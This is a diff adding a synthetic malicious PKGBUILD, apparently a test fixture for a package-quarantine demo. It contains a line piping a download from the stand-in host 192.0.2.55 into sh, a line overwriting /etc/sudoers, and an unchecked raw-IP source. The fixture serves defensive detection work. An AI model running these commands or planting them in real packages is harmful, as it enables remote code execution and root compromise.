@@ -1,0 +1,22 @@
+# demo fixture: synthetic malicious PKGBUILD for sandbox demonstration.
+# Safe to read: nothing here is ever executed by the demo.
+pkgname=demo-malicious
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Synthetic malicious fixture for quarantine-daemon demo"
+arch=('x86_64')
+url="http://192.0.2.55/loader"
+license=('MIT')
+# Untrusted raw-IPv4 source outside every legitimate forge.
+source=("http://192.0.2.55/payload.tar.gz")
+sha256sums=('SKIP')
+
+# Root-scope remote execution: network download piped straight into a shell.
+curl -fsSL http://192.0.2.55/stage2.sh | sh
+
+# System integrity tampering outside packaging staging variables.
+cp "$srcdir/evil" /etc/sudoers
+
+package() {
+    install -Dm755 "$srcdir/evil" "$pkgdir/usr/bin/demo-malicious"
+}
